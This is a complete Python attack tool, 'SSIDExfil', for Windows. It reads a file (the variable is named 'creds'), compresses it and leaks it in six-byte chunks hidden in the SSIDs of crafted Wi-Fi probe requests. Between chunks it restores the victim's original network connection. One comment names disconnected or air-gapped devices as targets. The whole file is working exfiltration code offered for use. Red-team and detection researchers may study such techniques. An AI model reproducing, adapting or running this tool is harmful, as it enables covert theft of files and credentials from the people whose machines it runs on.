#!/usr/bin/python3

# SSIDExfil by Nick Paul and AJ Lopez
# Platform : Windows
# ------------------------------------------------------------------------------------------------
# A tool that exfiltrates data by encoding it into 802.11 probe request SSIDs.
# Data is compressed and split into chunks, each transmitted as a crafted SSID.
# ------------------------------------------------------------------------------------------------
# Usage: python SSIDEXFIL.py <path_to_file>

import time
import sys
import re
import zlib
import pywifi
import subprocess
from pywifi import const


# Prefix character used to identify exfiltration probe requests
START_CHAR = '*'

currentProfile = None


def getCurrentProfile(iface):
    """Record the current WiFi profile so we can reconnect after transmission."""
    global currentProfile
    try:
        netshOutput = subprocess.Popen(
            'netsh wlan show interfaces', shell=True, stdout=subprocess.PIPE
        )
        output = list(map(
            str.strip,
            netshOutput.stdout.read().decode("utf-8").replace('\r', '').strip().split('\n')
        ))
        for x in output:
            if 'Profile' in x and 'Connection' not in x:
                stringProfile = (x.replace(re.findall('^Profile[ ]*: ', x)[0], ''))
                for profile in iface.network_profiles():
                    if profile.ssid == stringProfile:
                        currentProfile = profile
    except Exception:
        # No current profile — device is disconnected or air-gapped
        pass


def compress(data):
    """Compress raw bytes and split into SSID-sized chunks."""
    exfilList = []
    maxLength = 6
    compressed = zlib.compress(data, 1)

    if len(compressed) >= 32:
        temp = (compressed[0 + i:maxLength + i] for i in range(0, len(compressed), maxLength))
        exfilList = [section for section in temp]
    else:
        exfilList.append(compressed)

    return exfilList


def extract(iface, data):
    """Transmit each chunk as a probe request by connecting to a crafted SSID."""
    print('[+] Beginning exfiltration of {} chunk(s)...'.format(len(data)))

    for piece in data:
        try:
            ssid = START_CHAR + str(piece)

            extractProfile = pywifi.Profile()
            extractProfile.ssid = ssid
            extractProfile.auth = const.AUTH_ALG_OPEN
            extractProfile.akm.append(const.AKM_TYPE_NONE)
            extractProfile.cipher = const.CIPHER_TYPE_NONE
            extractProfile = iface.add_network_profile(extractProfile)

            iface.connect(extractProfile)
            time.sleep(1)

            print('[+] Transmitted: {} ({} bytes)'.format(ssid, len(ssid)))

            # Reconnect to original network between transmissions
            if currentProfile:
                iface.connect(currentProfile)

            iface.remove_network_profile(extractProfile)

        except Exception as e:
            print('[-] Error transmitting chunk: {}'.format(str(e)))

    print('[+] Exfiltration complete.')


if __name__ == '__main__':

    if len(sys.argv) < 2:
        print('Usage: python SSIDEXFIL.py <path_to_file>')
        sys.exit(1)

    filePath = sys.argv[1]

    try:
        with open(filePath, 'rb') as f:
            creds = f.read()
    except FileNotFoundError:
        print('[-] File not found: {}'.format(filePath))
        sys.exit(1)

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.name()

    getCurrentProfile(iface)
    compressedData = compress(creds)
    extract(iface, compressedData)
